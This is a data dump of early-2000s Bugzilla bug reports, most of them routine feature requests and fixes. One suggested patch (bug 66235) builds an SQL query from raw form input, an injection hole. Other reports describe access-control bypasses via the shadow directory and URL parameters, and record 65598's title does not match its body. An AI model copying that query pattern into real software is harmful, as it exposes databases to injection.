59994%TAB%974119456%TAB%1537%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%handle CGI timeouts/aborts by aborting database calls%TAB%handle CGI timeouts/aborts by aborting database callsSome (many? all?) webservers abort CGI scripts if they output no text for long periods of time.  In the case of Apache, this seems to be 300 seconds (5 minutes).  For bugzilla.mozilla.org, this is probably a good value, because we don't want the shadow db tied up for much longer than that (syncs cannot happen while searches are going on).  It turns out that the current mechanism for aborting the scripts doesn't cause any in-progress SELECTs to be aborted, which means that truly bad searches can and do continue for very long periods of time (hours even -- thus causing the shadow_db to remain out of sync).  Bugzilla needs to have abort-handlers that kill any appropriate running SQL calls (not necessarily all SQL calls, however, as we can't afford to leave the db in an inconsistent state).  After much groveling through documentation (as well as the source code to Apache), I think I've figured out the strategy for this.  It appears as though when CGIs are timed out by Apache, they get sent a SIGTERM and then three seconds later a SIGKILL, so this is an opportunity to cleanup. Ideally, we'd use the DBI statement cancel function.  Unfortunately, DBI::mysql doesn't implement that, but presumably it could be added.  Alternately,  we could find the $dbh->{'thread_id'} and then use system() to fork off a mysqladmin to kill the thread in question or even perhaps exec() mysqladmin in our own process slot.  Note, however, that "man DBI" tells us that:         The first thing to say is that signal handling in Perl is        currently not safe. There is always a small risk of Perl        crashing and/or core dumping when, or after, handling a        signal.  (The risk was reduced with 5.004_04 but is still        present.)  There is also experimental code included with 5.005 (Thread::Signal) which runs which runs signal handlers on a separate thread.  However, 5.005 doesn't appear to me to be built multithreaded by default, so this seems overly risky.  In any case, we'll need to encourage folks to upgrade to 5.004_04.  And crashing in a signal handler will usually be better than running forever and leaving the shadow database out of sync.  Probably the short-term fix is to just use a cronjob script that runs 'mysqladmin processlist' every so often and kill off any long-running threads. In fact, we're likely to want to do this anyway, given the signal-handler lossage.  It also wouldn't be difficult to patch MySQL to cause long_queries to be killed when they hit the time limit.  With both of these quick fixes, though, I'm a bit afraid of one really evil SELECT (which might take > 5 mins on its own) significantly slowing down other SELECTs (which might only take 3 mins on their own) and then having the entire batch of threads get killed).  Probably the answer to this (easy to implement in the cronjob) is to never kill more than 1 thread per x minute interval, for some value of x.
60818%TAB%974743317%TAB%18534%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs,attachment and request management%TAB%Bugzilla rejects attachment type 'text/plain;charset=utf-8'%TAB%Bugzilla rejects attachment type 'text/plain;charset=utf-8'I just tried to upload an attachment with MIME type      text/plain;charset=utf-8  and Bugzilla rejected it with a remark similar to:      You need to provide a valid MIME type. 'text/plain;charset=utf-8' simply     will not do it.
61343%TAB%975403025%TAB%5500%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,User Accounts%TAB%Should be able to default groups to on when submitting a bug%TAB%Should be able to default groups to on when submitting a bugWhen submitting a bug it should be possible to have the default be:  	Only people in the "XXX" group can see this bug  instead of:  	People not in the "XXX" group can see this bug  I would add an additional checkbox for editusers for each group which would say something like:  	This bit is on by default.  The above bug fixes the described problem.  It is based on our local copy of bugzilla which is based on 2.10.  It requires a new field called 'defaultgroupset' be added to the profiles table.  The patch has the following features:  1. You can enable/disable the bit for each user in editusers.cgi; 2. enter_bug.cgi will set the a group to on if defaultgroupset has that bit set in defaultgroupset; and 3. If there is a regular expression for a group, any new user who matches that regular expression will have that bit enabled in their defaultgroupset.  Enjoy!
61487%TAB%975497053%TAB%12661%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Mozilla Developer,Documentation,User Interface%TAB%Normal Severity is not described in "A Bug's Life Cycle",describe Normal Severity in "A Bug's Life Cycle"%TAB%Normal Severity is not described in "A Bug's Life Cycle",describe Normal Severity in "A Bug's Life Cycle"All of the possible values for the Severity field in Bugzilla are described in "A Bug's Life Cycle" at http://bugzilla.mozilla.org/bug_status.html  except for "Normal".
61634%TAB%975585009%TAB%22429%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Small change for target milestones,describe Milestone URL in edit products page%TAB%Small change for target milestones,describe Milestone URL in edit products pageSorry for the brevity, it made sense to me at the time :)  On the edit products page there is a field labeled "Milestone URL:".  It is a url to a file that describes what the milestones are for each product.  The url is used to create a link when viewing a bug, the words "Target Milestone", next to the pull down list, becomes a link that takes you to the page you specify in the "Milestone URL:".  I found that the words "Milestone URL:" were insufficient to describe the above effects.  I think that if the notargetmilestone.html file that is included with bugzilla where the default entry in this field whenever a componenet was created, it would be more intuitive and clearer. 1)  It would then create the link on every bug so that you wouldn't have the erratic behavior of "Target Milestone" sometimes being a link and other times not.  Currently if the "Milestone URL:" field is empty, no link is created. 2)  This could also be resolved by a short paragraph that describes what in blue blazes the "Milestone URL:" on the edit products page does. Hope this helps clear this up.  I think this would be an easy fix, depending on what method is implemented (both preferably).  I might even patch this myself when i get time :)
61637%TAB%975585539%TAB%22429%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Code bit for upgrading from 2.5%TAB%Code bit for upgrading from 2.5Hi,   I recently upgraded from bugzilla 2.5 and found that the setup.pl script missed a few things.  The descriptions are stored in a table called comments, that uses a "when" field and other minor things.  I found that the below lines of code altered the comments table and changed it to longdesc and worked fine.  I think it should be enclosed in a if statment (checking that the table "comments" exists), but I am not familiar enough with MySql to check if a table exists. Heres the code:  # 2000-11-27  For bugzilla 2.5 and later,  #  had to restructure comments to longdescs the new #  name of the comments table RenameField ('comments', 'when', 'bug_when'); ChangeFieldType('comments', 'bug_id', 'mediumint not null'); ChangeFieldType('comments', 'who', 'mediumint not null'); ChangeFieldType('comments', 'bug_when', 'datetime not null'); RenameField('comments','comment','thetext'); # Here we rename comments to longdescs $dbh->do("DROP TABLE longdescs"); $dbh->do("ALTER TABLE comments RENAME longdescs");  Just wanted to say that bugzilla is the most edit-customize friendly code I have ever worked on, without souding like a kiss up. P.S.  I checked the severity definitions and since there is loss of data I figured Major severity was approp.  Sorry in advance if it isn't.
61648%TAB%975590646%TAB%22500%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%SQL inserts do not match constraints%TAB%SQL inserts do not match constraintsSeveral of the insert statements in checksetup.pl do not insert values for columns that are defined "not null".  Specifically for the tables:  groups, products, components.  I'll attempt to attach a patch here in a minute.
61824%TAB%975746623%TAB%22574%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%newmailtech won't be used if you use emailsuffixes%TAB%newmailtech won't be used if you use emailsuffixesSome code in processmail appears to append Param('emailsuffix') to the username before recursive processing begins, with the result that further lookups of those usernames (to check if newmailtech is enabled, for instance) will fail.  The code appears to append the emailsuffix just before it sends the email out anyway, so removing that code appears to fix things in the case that emailsuffixes are enabled (I haven't yet managed to check in the case that they're not enabled).  I'll attach a patch when I've submitted this.
61972%TAB%975973692%TAB%7322%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%[RFE]Put link to Sean's help doc to query.cgi%TAB%[RFE]Put link to Sean's help doc to query.cgihttp://www.mozilla.org/quality/help/beginning-duplicate-finding.html - After about a half hour of trying to find this, I believe that you should add a link to this in query.cgi. It would only require one line of code. It is relavent to the page, and will make it so people won't have to go through what I went through. It would also be good for newbies. I will submit a patch if I am able to get access to the source.
62000%TAB%976010393%TAB%6205%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General,Creating/Changing Bugs,attachment and request management%TAB%Bug file attachments broken under Windows%TAB%Bug file attachments broken under WindowsThe act of attaching a file to a bug under Windows is broken in Bugzilla.   Adding the following two lines to showattachment.cgi will fix this.  Should  there be an "is_windows" parameter in the conf file that could wrap all of the  hacks?   use diagnostics;  use strict;   require "CGI.pl";  +binmode(STDIN); +binmode(STDOUT);   ConnectToDatabase();  For creating Attachments under Windows the following two lines  binmode(STDIN); binmode(STDOUT);  has to be added into the CREATEATTACHMENT.CGI BEFORE the "require 'CGI.PL;'"- line.  If the two lines are missing, the system seems to hang in the subroutine ProcessMultipartFormFields (in CGI.pl) and ends with a "CGI Timeout".  The "is_windows" param is a fine idea !
62463%TAB%976413685%TAB%15561%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%Bugzilla helper "Search Bugzilla" broken.%TAB%Bugzilla helper "Search Bugzilla" broken.If on step 2 of the Bugzilla helper you type in some text to search for in bugzilla, then hit enter, the form submits itself to the same page which is rather useless. The desired action for the form is only undertaken if the user clicks on the search button.  Could this be fixed by adding:  onSubmit="SearchForBugs(this.form.keywords.value,this.form.searchLong)" to the <form> element?  Or something.
62618%TAB%976558865%TAB%1537%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%regression: tooltips change breaks longdescs display%TAB%regression: tooltips change breaks longdescs displayIt turns out that the first time the quoteUrls patch from 59515 actually recognizes another bug number to URLify, it does a SendSQL, which causes any remaining unfetched data from the previous SendSQL (done by the caller of quoteUrls) to be discarded.  The upshot is that any subsequent longdescs are not displayed.  The problem is the fact that the state related to SendSQL is global.  So I've slapped together a patch which allows one to push all that state onto a stack. This allows for arbitrarily deep nesting of queries.  The patch also uses this mechanism to give quoteUrls its own state to use.
62729%TAB%976665871%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Query/Bug List%TAB%Real name capability on bug_list.cgi.%TAB%Real name capability on bug_list.cgi.Split off of bug #38135, which suggested that the email addresses on bug_list.cgi be followed by real names like on show_bug.cgi.  I instead suggest there should be separate columns like "QA Contact (Real Name)" that the user can elect to show with or instead of the e-mail address, for all e-mail address columns.
62832%TAB%976775191%TAB%4897%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Make an option for "newemailtech" to be default%TAB%Make an option for "newemailtech" to be defaultI wrote a patch that will allow newemailtech to be set as the default mailing scheme via editparams.cgi.  This patch does not change any existing users preference, it only makes it so all new users have newemailtech turned on by default (they still have the option to turn it off).  Also, the default value for this is "off" so nothing happens unless you specifcally change the setting in editparams.cgi.
62949%TAB%976868934%TAB%21810%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Initial TestComponent has an empty owner field%TAB%Initial TestComponent has an empty owner fieldWhen initially installed, the test component has an empty owner field. This  means that if bugs are reported without setting this field they are associated  with the user with no email address. This entry cannot be removed without  resorting to the mysql prompt by hand. The edit users window leaves you with nothing to click on (because the email address is empty) and manually  attempting to construct an email address. Sanity check indicates that these  entries might be invalid.  This occurs with Bugzilla 2.10 and 2.11 at least.
63018%TAB%976909954%TAB%4415%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Creating/Changing Bugs%TAB%There are some backdoors to DefParam("letsubmitterchoosepriority")%TAB%There are some backdoors to DefParam("letsubmitterchoosepriority")saving a bug entry form as a bookmarkable template creates an url containing an entry for priority, even if the letsubmitterchoosepriority param is off.  Also, if the param is off and the user submits a bug containing that param in the url, the param is honored and the param can be set to something that is not the default (and perhaps invalid? - don't test this on b.m.o, you wise guys).  We have letsubmitterchoosepriority off and just changed our default priority to '--' and now people who use bug templates are submitting bugs with the old default priority (P3).  Dawn Endico Reporter
63249%TAB%977155822%TAB%11349%TAB%VERIFIED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Reporting/Charting%TAB%neither bug counts or bug charts works,Bug counts is very slow for Products with many bugs%TAB%neither bug counts or bug charts works,Bug counts is very slow for Products with many bugsGoing to the page http://bugzilla.mozilla.org/reports.cgi and asking for  either "Bug Counts" or "Bug Charts" does not work. "Bug Counts" just  times out on the Mac, while on Windows it prints the page header but no  content; "Bug Charts" on either platform shows just a  broken image icon.
63536%TAB%977399533%TAB%23214%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Creating/Changing Bugs%TAB%v2.10 Misleading interface after modifying bug seems to display form of bug just modified,v2.10 Misleading interface after modifying bug seems to display form of bug just modified (next bug is shown after submitting/committing),Misleading interface after modifying bug seems to display form of bug just modified (next bug is shown after submitting/committing),User preference for whether or not to go to the next bug after processing%TAB%v2.10 Misleading interface after modifying bug seems to display form of bug just modified,v2.10 Misleading interface after modifying bug seems to display form of bug just modified (next bug is shown after submitting/committing),Misleading interface after modifying bug seems to display form of bug just modified (next bug is shown after submitting/committing),User preference for whether or not to go to the next bug after processingSTEPS: Query Bug, Modify, Commit then recieve confirmation of submission of  changes. Below confirmation there is the form of a bug report with drop-down  menus etc. PROBLEM: Because confirmation message is in large bold font and at top of page  there is text showing bug number of modified bug (both circled in red in  attachment)while the bug report interface below it is cluttered it is easy to  mistake the form as belonging to the bug just modified (I actually did -  despite the back to bug# link next to confirmation message) and not to realize  that as spelled out in inconspicuous text (circled in blue in attachment)the  form is really that of the next bug. Further modifications can then be  mistakenly made to the wrong bug requiring much correction.
65164%TAB%979244901%TAB%20048%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%not sending </html>%TAB%not sending </html>i noticed the other day that bugzilla/buglist.cgi is not sending </html> at the end of the document.  mozilla has a bug that causes it to throb on this (even though the socket connection has closed), so it is very noticeable. Noticed that bugzilla is also not sending </BODY>. Fixed both of them in sub PutFooter.  The only way I could see this breaking anything is if any non-serverpush text is being sent after PutFooter. I looked, but didn't see any.
65190%TAB%979275545%TAB%13272%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%query form: add comparison type "all words as substrings"%TAB%query form: add comparison type "all words as substrings"Both "(case-insensitive) substring" and "all words" comparison types are not optimal solutions if you want to query for several words:  >> The problem with the Simple one ["(case-insensitive) substring"]  >> is that, if people put in a few words relevant to their bug, it's  >> reasonably unlikely that those words will appear in that exact order  >> in the summary. Could we do "all words" instead? > >i've never found "all words" to be useful, because it won't let you type >"bookmarklet" and get hits for both "bookmarklet" and "bookmarklets".  C.Begle's SimpleSearch <http://www.mozilla.org/quality/help/simplesearch.html> solves this problem by generating boolean charts on the fly. The javascript for this page is located at <http://www.mozilla.org/quality/help/bugreport.js>.  (A more structured and further developed version can be found in bug 61561.)  It would greatly simplify things if you had an "all words as substrings" option in all comparison type dropdowns on the default query page, too. Probably it should even be the default.  Similarly, there could be an "any words as substrings" option, too.
65208%TAB%979284954%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Creating/Changing Bugs%TAB%Midair collision didn't happen.%TAB%Midair collision didn't happen.Just now baulig@suse.de should have got a midair collision on bug #24806 and didn't.  He wanted to add to cc but I beat him to it by adding my name to QA and putting in a comment.  He got an error message saying:  Only the owner or submitter of the bug, or a sufficiently empowered user, may make that change to the qa_contact field.  Assumedly because he was not allowed to change back to blank which it was when he loaded the page.  Is this check occurring before the midair collision check?  Or are we failing the midair collision check?  This all happened around Friday January 12 2001 16:27 UTC if you want to check the logs, about 10 minutes ago.
65290%TAB%979318995%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Edit system group regexp.%TAB%Edit system group regexp.editgroups.cgi doesn't let you edit the userregexp of system groups like canconfirm, you have to fiddle with mysql.
65311%TAB%979356381%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%If no products available, whine a bit.%TAB%If no products available, whine a bit.Split off from bug #58891.  If there are no bugzilla products available (because of usebuggroupsentry), we should not do this:  Enter Bug  First, you must pick a product on which to enter a bug.  <FOOTER>  We should do this:  Sorry, there are no products that you are authorised to enter bugs for.  <FOOTER>  At the very least.  I'm not sure if we should point the admin to the settings that might need to be changed.
65313%TAB%979359423%TAB%23914%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Accounts%TAB%Fails to detect some invalid email address when creating accounts,Failure to detect some invalid email addresses%TAB%Fails to detect some invalid email address when creating accounts,Failure to detect some invalid email addressesWhen you create a new Bugzilla account, it normally checks whether the email address you entered is valid. This check fails to detect some invalid email addresses.  The problem is the default regexp in defparams.pl is q:^[^@, ]*@[^@, ]*\\.[^@, ]*$:  This regexp doesn't catch embedded newlines, tab characters, backslashes and other weird stuff. It'd be better to explicitly list all characters which are allowed in an email address there: q:^[\\w\\d_\\.\\+\\-]+@[\\w\\d_\\.\\+\\-]+\\.[\\w\\d_\\.\\+\\-]+$: or something like this.  Note that * after a character class allows zero characters, so that it won't catch stuff like "@.", this should better be a + to require at least one character for the set.  Martin
65316%TAB%979361829%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%Typos on edit*.cgi.%TAB%Typos on edit*.cgi.There are some trivial typos on the page after you add a component, product or user.  What they are:  Back to the query page, edit more products or add components to this new product.. Back to the index, edit more users or add another user.. Back to the query page or edit more keywords or add another keyword. Back to the query page or edit more components or Add another component.  What they should be:  Back to the query page, edit more products or add components to this new product. [ "." not ".." ] Back to the index, edit more users or add another user. [ "." not ".." ] Back to the query page or edit more keywords or add another keyword. [ ", " not " or " ] Back to the query page or edit more components or Add another component. [ ", " not " or " + "add" not "Add" ]
65319%TAB%979362708%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Administration%TAB%editmilestones & editversions don't have extra add.%TAB%editmilestones & editversions don't have extra add.editmilestones & editversions don't have an "add" another like all of the other edit*.cgi scripts.  Instead that have "edit" which is a two step process.
65320%TAB%979363232%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Administration%TAB%Extra options on editproducts.cgi & editcomponents.cgi.%TAB%Extra options on editproducts.cgi & editcomponents.cgi.Currently after adding a product or component, there is an option to add components to it.  It would be handy to have options to add products after both of these too, especially the components one, since it allows you to drill up again.  I suggest it makes sense to have "add product" on editproducts as we already have "edit products".
65321%TAB%979363640%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Remove watches pref when new email tech off globally.%TAB%Remove watches pref when new email tech off globally.
65383%TAB%979410643%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Administration%TAB%Remove obsolete milestone prefs.,Clean up milestone prefs.,Clean up milestone prefs - currmilestone and nummilestones are obsolete.,Clean up milestone prefs - curmilestone and nummilestones are obsolete.%TAB%Remove obsolete milestone prefs.,Clean up milestone prefs.,Clean up milestone prefs - currmilestone and nummilestones are obsolete.,Clean up milestone prefs - curmilestone and nummilestones are obsolete.It looks like currmilestone and nummilestones are obsolete.  nummilestones should be removed, and currmilestone should be made per-product.  I will put deps for some bugs that would find this useful.
65396%TAB%979416174%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%Remember This Query should give option to add to page footer%TAB%Remember This Query should give option to add to page footerIt would be nice if the "remember this query" function did one or the other of  the following:  1) have a checkbox under the "remember this query and name it" for "and include  it in my page footer"  or alternatively  2) on the results page after saving it, have a link to add it to your page  footer.  I often find myself creating new queries that I want to have in my footer, and  it's a pain in the neck to go into the preferences to put it there after each  one.
65399%TAB%979416875%TAB%4412%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Query page falls over if product has no components.%TAB%Query page falls over if product has no components.aughty, naughty, someone wasn't looking for other instances of a bug when they fixed it (bug #40987).  But then, I can't talk, as I verified the bug.  query.cgi should at least give a coherent error.  It should probably also continue to work, but skip that product so the whole thing doesn't fall over because of one product (do we have the ability to allow different groups access to add components to different products?)  If it does work probably, we should probably emit a warning in mail, query.cgi, the error log or something.  Should check all the .cgis in the product.  I'll try and get around to that shortly.
65477%TAB%979502912%TAB%10297%TAB%RESOLVED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla 3,Bugzilla,User Accounts,Email Notifications%TAB%Allow different styles of bugmail by user preference (HTML?),Allow different styles of bugmail by user preference (HTML, XML, etc.),Send HTML bugmail (as multipart/alternative so that text/plain is also still sent),Send HTML bugmail%TAB%Allow different styles of bugmail by user preference (HTML?),Allow different styles of bugmail by user preference (HTML, XML, etc.),Send HTML bugmail (as multipart/alternative so that text/plain is also still sent),Send HTML bugmailFrom discussion in bug 51946, we suddenly realized that the new email preference  flags made available by bug 17464 would make it possible for there to be more  than one type of bugmail notification, and for the user to choose which type they  wanted.  The three types I can think of right off the bat are: 1) text/plain optimized for a monospace font (should be the default) 2) text/plain optimized for the proportional font 3) text/html with the changes in a table (like the Bug Activity link online)
65572%TAB%979606026%TAB%12908%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla allows viewing of bugs without permission,bugzilla's shadow dir allows viewing of bugs without permission%TAB%bugzilla allows viewing of bugs without permission,bugzilla's shadow dir allows viewing of bugs without permission
65598%TAB%979634515%TAB%10297%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%checksetup.pl should check minimum versions on prerequisites%TAB%checksetup.pl should check minimum versions on prerequisites65598Look at bug 34674. Using a normal bugzilla account (or no account) you will get 'you do not have permission to view this bug'.  Now look at http://bugzilla.mozilla.org/shadow/34674  Actual result: shows bug Expected result: Permission denied  The shadow directory should contain an .htaccess file disallowing viewing anything from this directory. The documentation and the checksetup script do not mention this.
66014%TAB%979907522%TAB%11345%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%Add initialqacontact field checking to sanitycheck%TAB%Add initialqacontact field checking to sanitycheckthis is an offshoot of bug 56822.  sanitycheck.pl needs to check values of components.initialqacontact in a way that allows for nulls
66058%TAB%979975019%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Requirements%TAB%Bugzilla,Bugzilla-General%TAB%"Changed" date should be more informative%TAB%"Changed" date should be more informativeIf you're doing a Bug List the "Changed" field should be more informative. What about the following: If changed today: write the time (fx 12:24:34) If changed this week: write short date plus short time (01/19 12:24) If changed later than this week: write full date: 2001-01-19
66149%TAB%980087460%TAB%21859%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%use a better error on failed DBI->Connect%TAB%use a better error on failed DBI->ConnectReport the $DBI::errstr rather than a general failure. Helps during debugging.
66154%TAB%980090380%TAB%21859%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%syntax error in reports.cgi%TAB%syntax error in reports.cgiCurrent CVS code has a syntax error in reports.cgi (perl -c reports.cgi generates reports as line 43).  Kills reports.cgi.
66235%TAB%980179967%TAB%18202%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%process_bug.cgi: multiple product change misses the groupset bit%TAB%process_bug.cgi: multiple product change misses the groupset bitWhen mass editing multiple bugs, the process_bug.cgi script changes the product name (ane components) from the old to the new, but it fails to set the 'groupset' bit to the new product's group bit.  There are several places to fix it, I added the following right around line 359/360 (from v2.10, inside the "foreach my $field..." loop):  if (defined $::FORM{'product'}) {   my $name = trim($::FORM{'product'});   if (($name ne $::dontchange) && ($name ne "")) {     ConnectToDatabase();     SendSQL("select bit from groups where name = '$name'");     my $bit = FetchOneColumn();     if (defined $bit) {       DoComma();       $::query .= "groupset = $bit";     }   } }
66651%TAB%980478140%TAB%6793%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Email,attachment and request management%TAB%include link to attachment in notification mail%TAB%include link to attachment in notification mailhen someone creates a attachment in bugzilla you get a notification mail like  this: ----- Additional Comments From xxxx ------- Created an attachment (id=23496) Testcase from bug 1  It could be nice if there where a direct link to the attachment. Something like: ----- Additional Comments From xxxx ------- Created an attachment (id=23496) <url:http://bugzilla.mozilla.org/showattachment.cgi?attach_id=23496> Testcase from bug 1
66876%TAB%980686248%TAB%23914%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%PATCH: Using userids (mediumint) for initialowner and initialqacontact%TAB%PATCH: Using userids (mediumint) for initialowner and initialqacontactHi,  concerning bug #24806, here's a patch which changes the initialowner and initialqacontact fields from tinytext to mediumint.  Martin
67036%TAB%980835558%TAB%24750%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Query/Bug List%TAB%comma in component name prevents query by component,Can't query for product, component, version names that have commas%TAB%comma in component name prevents query by component,Can't query for product, component, version names that have commasComponent names which contain commas seem to prevent queries by component from obtaining any results.
67046%TAB%980838683%TAB%21190%TAB%RESOLVED%TAB%FIXED%TAB%Testing%TAB%Bugzilla,Bugzilla Helper,Bugzilla-General%TAB%Final popup windows pops up blank when using mozilla!%TAB%Final popup windows pops up blank when using mozilla!Entering a bug report with mozilla doesn't work. When I click on the "Open bugzilla entry form" all I get is a blank popup window. (well, actually I get a window with my homepage, but that is a known mozilla bug). This bug is 100% reproducible.
67077%TAB%980852887%TAB%12963%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,User Interface%TAB%No time zone on bug comments,Bugzilla should display the time zone on all times%TAB%No time zone on bug comments,Bugzilla should display the time zone on all timesThe comments entered on a bug have a time stamp but it doesn't indicate the timezone it is in.    Ideally, the user should be able to configure the time zone to their local time zone so they can see the times in their local time.  Regardless, the time zone should be displayed so that users can accurately determine when the comment was made.
67278%TAB%980982333%TAB%21859%TAB%VERIFIED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%Footer lines need separation%TAB%Footer lines need separationThe footer at the bottom tends to get pretty disgusting after a few remembered queries. Proposed solution is attached. It turns the bottom into a row along the format of:  New | Query | Find | My Votes My Bugs | <remembered queries> Edit Prefs | Log out  This definitely helps with multiline remembered queries, might offer easier expansion in case we want to add more later.
67375%TAB%981044872%TAB%44%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla: Keyword & Component Changes,Creating/Changing Bugs%TAB%Move '--' further down in priority sort,use sortkeys for priorities%TAB%Move '--' further down in priority sort,use sortkeys for prioritiesCurrently, '--' comes before P1 in the sort order.  This means that if the owner doesn't assign a priority to the bug (usually out of neglect or ambivalence), then those bugs will stay at the top of everyone's bug list even though they may not be considered important bugs.
67482%TAB%981115299%TAB%15478%TAB%VERIFIED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%real names with parens ( ) confuse bugzilla%TAB%real names with parens ( ) confuse bugzillaReal names with parens ( ) confuse bugzilla.  For example, look at any bug assigned to Leaf, like bug 7487.  Scroll down a bit, and two lines above the "commit" button it reads "Reassign bug to leaf@netscape.com (Daniel" instead of "Reassign bug to leaf@netscape.com".  This can cause strange things, see my comment dated 2000-10-27 06:38 in bug 20092:  | I managed to change bug 36358 from assigned to new although I'm not allowed | to do something like this.  This is how I did that: | | I wasn't logged in to Bugzilla when viewing that bug.  Then I added my | comment, and logged in in another Mozilla window.  Then I hit commit. | Bugzilla complained that I tried to change the owner or something from | "leaf@netscape.com" to "leaf@netscape.com (Daniel" (without the quotes). So | I hit the back button and deleted the " (Daniel" from the "assign to" | field. I hit commit again and this time Bugzilla was happy with it.  Maybe it's even one of the reasons for bug 20092.  And if not, it's at least confusing.  I really thought this bug would have been filed already, but I just couldn't find it.  By the way, this is the reason why I put my IRC nick inside [ ] instead of ( ).
67663%TAB%981340237%TAB%21859%TAB%RESOLVED%TAB%FIXED%TAB%Development%TAB%Bugzilla,Bugzilla-General%TAB%sub redefined,globals.pl and bug_form.pl emit "subroutine redefined" messages,globals.pl and CGI.pl emit "subroutine redefined" messages%TAB%sub redefined,globals.pl and bug_form.pl emit "subroutine redefined" messages,globals.pl and CGI.pl emit "subroutine redefined" messagesglobals.pl and bug_form.pl emit "subroutine redefined" messages, and a huge amount of other stuff when run.  This is caused by RelationSet.pm being used instead of required, as RelationSet.pm uses these files, causing them to be run twice. This was cluttering up the logs, and was not "perfect code". joy.
67707%TAB%981377620%TAB%7577%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla-General%TAB%bugzilla DOS,bugzilla DoS%TAB%bugzilla DOS,bugzilla DoSEvery now and then some idiot hits bugzilla with search engine, recursive  queries, or something that follows all links on previous page. This is causing  bunch of simultaneous hits to the database, and eventually load goes very high  (I have seen 40-50).   So far what I have done is to look who is the bad guy and blocked their access  in Apache to bugzilla. But could this be something that bugzilla would track?  For example bugzilla could record every hit it's getting from each IP  and:  if($hits_last_minute{"$ip"} > $limit){ reject_access(); }
67950%TAB%981512684%TAB%15478%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Move the quip list into the database%TAB%Move the quip list into the databaseThis one doesn't seem too dificult... change buglist.cgi to read from the database, the quip addition routing to write to it and checksetup.pl to convert.  How complicated should the db be?  Should we record who's adding the quips and allow them to edit/change them later?
68022%TAB%981547542%TAB%25075%TAB%RESOLVED%TAB%FIXED%TAB%Architecture%TAB%Bugzilla,Bugzilla 3,Bugzilla,Bugzilla-General%TAB%Need more than 55 groups%TAB%Need more than 55 groupsCurrently, bugzilla can handle a maximum of 55 user defined groups, because of  the 64 bit limit of perl. If one want's to control the visibility of a large  number of products, this limit is too scarce.  I suggest using the perl packages "Bit::Vector", "Set::IntRange" &  "Math::BigIntFast" by Stefen Beyer, which can handle bit vectors of arbitrary  size and provides efficient methods for handling them. (see http://www.perl.com/CPAN-local//modules/by-authors/Steffen_Beyer/).
